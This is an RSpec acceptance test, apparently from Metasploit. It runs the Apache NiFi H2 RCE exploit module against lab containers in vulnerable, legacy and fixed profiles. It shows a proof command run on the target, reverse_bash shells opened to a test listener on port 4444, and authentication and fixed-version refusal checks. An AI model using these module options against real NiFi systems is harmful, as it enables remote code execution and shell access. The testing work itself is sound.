require 'acceptance_spec_helper'
require 'json'
require 'timeout'

profile = ENV.fetch('NIFI_H2_PROFILE', 'vulnerable')
raise ArgumentError, 'Unknown NiFi H2 profile' unless %w[legacy vulnerable fixed].include?(profile)

RSpec.describe 'Genuine NiFi H2 file-database targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    @service = profile
    @native_sequence = 0
    @native = native_action('preflight')
    @accounts = File.readlines('test/module_targets/nifi/accounts.env', chomp: true).to_h { |line| line.split('=', 2) }
    # Console run creates execution replicants. Observe the standard event bus
    # without wrapping requests or changing callback lifetime/return values.
    ready = console_command(%q{irb -e 'observer = Object.new.extend(Msf::GeneralEventSubscriber); def observer.on_module_run(mod); @last_run = mod if mod.refname == "linux/http/apache_nifi_h2_rce"; end; framework.instance_variable_set(:@module_target_nifi_observer, observer); framework.events.add_general_subscriber(observer); puts "MODULE_TARGET_NIFI_OBSERVER=ready"'})
    expect(ready).to match(/^MODULE_TARGET_NIFI_OBSERVER=ready\r?$/)
    @observer_installed = true
  end

  before do |example|
    @case_id = example.metadata.fetch(:scoped_id).tr(':', '_')
    @attempted_module = false
    @before_state = native_action('snapshot')
    expect(@before_state.fetch('graph')).to eq(@native.fetch('initial_snapshot').fetch('graph'))
  end

  after do |example|
    next unless @before_state

    console_command('sessions -K')
    console_command('jobs -K')
    current = native_action('snapshot')
    if example.exception && @attempted_module && current.fetch('graph') != @before_state.fetch('graph')
      native_action('restore', @before_state, owned_identifiers)
    end
    restore_database_files(current)
    target_exec(@service, 'rm', '-f', '/tmp/module-target-nifi-h2-command-proof', '/tmp/module-target-nifi-h2-session-proof')
  end

  after(:all) do
    native_action('verify-canary') if @native
  ensure
    console_command(%q{irb -e 'observer = framework.instance_variable_get(:@module_target_nifi_observer); framework.events.remove_general_subscriber(observer); framework.instance_variable_set(:@module_target_nifi_observer, nil)'}) if @observer_installed
  end

  it 'reports the actual H2 policy boundary twice' do
    2.times do
      output = invoke({}, action: 'check')
      reason = if profile == 'legacy'
                 'Apache NiFi instance does not support logins'
               elsif profile == 'fixed'
                 'non-vulnerable version detected: 1.22.0'
               else
                 'vulnerable version detected: 1.21.0'
               end
      expect(output).to include(reason)
      expect_graph_restored
    end
  end

  if profile != 'fixed'
    it 'executes a generic command twice with exact API cleanup and recorded file-database artifacts' do
      options = profile == 'legacy' ? { 'DELAY' => 30 } : {}
      2.times { prove_execution('cmd/unix/generic', extra: options, session: false) }
    end

    it 'opens real command shells twice and records the declared database files' do
      options = profile == 'vulnerable' ? { 'DELAY' => 30 } : {}
      2.times { prove_execution('cmd/unix/reverse_bash', extra: options) }
    end
  end

  if profile == 'legacy'
    it 'rejects the branded missing-base page as an H2 application twice' do
      2.times do
        output = invoke({ 'TARGETURI' => '/module-target-missing/' }, action: 'check', allow_errors: true)
        expect(output).to include('Unable to determine if logins are supported')
        expect_graph_restored
      end
    end
  end

  if profile == 'vulnerable'
    it 'executes through a genuine independently obtained bearer token twice' do
      2.times { prove_execution('cmd/unix/generic', session: false, extra: { 'USERNAME' => '', 'PASSWORD' => '', 'BEARER-TOKEN' => @native.fetch('token') }) }
    end

    it 'rejects a real wrong password twice without persistent components' do
      2.times do
        output = invoke({ 'PASSWORD' => 'module-target-wrong-password', 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'id', 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('Invalid Credentials')
        expect_graph_restored
      end
    end

    it 'refuses missing authentication twice without persistent components' do
      2.times do
        output = invoke({ 'USERNAME' => '', 'PASSWORD' => '', 'BEARER-TOKEN' => '', 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'id', 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('Authentication is required')
        expect_graph_restored
      end
    end
  end

  if profile == 'fixed'
    it 'honors the fixed-version AutoCheck refusal twice' do
      2.times do
        output = invoke({ 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'id', 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('The target is not exploitable')
        expect_graph_restored
      end
    end

    it 'cannot execute H2 on the real fixed JDBC policy when explicitly forced twice' do
      2.times do
        path = '/tmp/module-target-nifi-h2-command-proof'
        output = invoke({ 'ForceExploit' => true, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "/usr/bin/touch #{path}", 'DisablePayloadHandler' => true }, allow_errors: true)
        expect(output).to include('ForceExploit is enabled', 'Configured db connection pool', 'Started processor')
        # Native validation refuses the scheme; asynchronous run-status HTTP200
        # is not proof that a connection or the payload command executed.
        expect(@native.fetch('native_h2').fetch('validation').fetch('component').fetch('validationErrors').join).to include('unsupported scheme [jdbc:h2]')
        expect(native_file_present(path)).to eq('')
        expect_graph_restored
        current = native_action('snapshot')
        restore_database_files(current)
      end
    end
  end

  def native_action(action, *arguments)
    @native_sequence += 1
    tag = "#{@case_id || 'suite'}-#{@native_sequence}-#{action}"
    output, error, status = Open3.capture3('python3', '-B', 'test/module_targets/nifi_h2/native.py', action, @service, tag, *arguments.map(&:to_json))
    File.write(File.join(target_runtime.fetch('artifacts'), "native-status-#{tag}.json"), JSON.pretty_generate(exitstatus: status.exitstatus, stdout: output, stderr: error))
    expect(status.success?).to be(true), error
    JSON.parse(output)
  end

  def invoke(options = {}, action: 'run -z', service: @service, allow_errors: false)
    # Legacy generic commands and the current release's shell control use the
    # ordinary thirty-second default; other cases retain their explicit delays.
    defaults = { 'SSL' => @native.fetch('secure'), 'VHOST' => @service, 'TARGETURI' => '/', 'DELAY' => 2, 'HttpTrace' => false }
    if @native.fetch('secure')
      defaults.merge!('USERNAME' => @accounts.fetch('SINGLE_USER_CREDENTIALS_USERNAME'), 'PASSWORD' => @accounts.fetch('SINGLE_USER_CREDENTIALS_PASSWORD'))
    end
    console_command(%q{irb -e 'framework.instance_variable_get(:@module_target_nifi_observer).instance_variable_set(:@last_run, nil)'})
    @attempted_module = true
    values = defaults.merge(options)
    bearer = values.delete('BEARER-TOKEN').to_s
    raise ArgumentError, 'Unexpected fixture bearer characters' unless bearer.match?(/\A[A-Za-z0-9_.-]*\z/)

    values.merge!('HttpTrace' => true, 'HttpTraceHeadersOnly' => true) unless bearer.empty?
    # The ordinary DELAY=30 cleanup waits twice, independently of session wait.
    command_timeout = [40, values.fetch('DELAY') * 2 + 20].max
    output = run_target_module('exploit/linux/http/apache_nifi_h2_rce', service, values, action: "#{action} -o BEARER-TOKEN=#{bearer}", allow_errors: allow_errors, command_timeout: command_timeout)
    unless bearer.empty?
      receipt = console_command(%q{irb -e 'mod = framework.instance_variable_get(:@module_target_nifi_observer).instance_variable_get(:@last_run); puts "MODULE_TARGET_NIFI_BEARER=" + {refname: mod&.refname, token: mod&.datastore&.[]("BEARER-TOKEN")}.to_json'})
      data = receipt[/^MODULE_TARGET_NIFI_BEARER=(\{.*\})\r?$/, 1]
      expect(data).not_to be_nil, receipt
      expect(JSON.parse(data)).to eq('refname' => 'linux/http/apache_nifi_h2_rce', 'token' => bearer)
      expect(output).to include("Authorization: Bearer #{bearer}")
    end
    expect(output).not_to include('Unknown datastore option:')
    expect(output).not_to match(/Manual cleanup is required|Unable to stop processor|Unable to create a new processor/) unless allow_errors
    output
  end

  def owned_identifiers
    output = console_command(%q{irb -e 'mod = framework.instance_variable_get(:@module_target_nifi_observer).instance_variable_get(:@last_run); puts "MODULE_TARGET_NIFI_OWNED=" + {refname: mod&.refname, processors: Array(mod&.instance_variable_get(:@processor)), services: Array(mod&.instance_variable_get(:@db_con_pool))}.to_json'})
    data = output[/^MODULE_TARGET_NIFI_OWNED=(\{.*\})\r?$/, 1]
    expect(data).not_to be_nil, output
    JSON.parse(data)
  end

  def expect_graph_restored
    Timeout.timeout(10) do
      wait_for_expect(100, 0.1) { expect(native_action('snapshot').fetch('graph')).to eq(@before_state.fetch('graph')) }
    end
  end

  def prove_execution(payload, extra: {}, session: true)
    path = session ? '/tmp/module-target-nifi-h2-session-proof' : '/tmp/module-target-nifi-h2-command-proof'
    target_exec(@service, 'test', '!', '-e', path)
    options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10, 'DisablePayloadHandler' => !session }
    options.merge!('CMD' => "/usr/bin/touch #{path}", 'WfsDelay' => 0) unless session
    output = invoke(options.merge(extra))
    if session
      session_id = output[/Command shell session (\d+) opened/, 1]
      expect(session_id).not_to be_nil, output
      proof = console_command("sessions -i #{session_id} -c #{"/usr/bin/touch #{path}".inspect}")
      expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
    end
    Timeout.timeout(10) do
      wait_for_expect(100, 0.1) { expect(native_file_present(path)).to eq('present') }
    end
    expect(target_exec(@service, 'stat', '-c', '%U', path).strip).to eq('nifi')
    expect(console_command('sessions -K')).not_to match(/\[-\]|Exception|Unknown command/)
    target_exec(@service, 'rm', path)
    expect_graph_restored
    current = native_action('snapshot')
    paths = database_paths(current)
    expect(paths).not_to be_empty
    restore_database_files(current)
  end

  def database_paths(current)
    (current.fetch('temporary_paths') - @before_state.fetch('temporary_paths')).select { |path| path.match?(%r{\A/tmp/[A-Za-z0-9]{6,10}\.db\.(?:mv\.db|trace\.db|lock\.db)\z}) }
  end

  def restore_database_files(current)
    paths = database_paths(current)
    native_action('restore-db-files', paths) unless paths.empty?
  end

  def native_file_present(path)
    raise ArgumentError, 'Invalid fixture proof path' unless path.match?(%r{\A/tmp/module-target-nifi-h2-[a-z-]+\z})

    target_exec(@service, 'sh', '-c', "if test -f #{path}; then printf present; fi")
  end
end
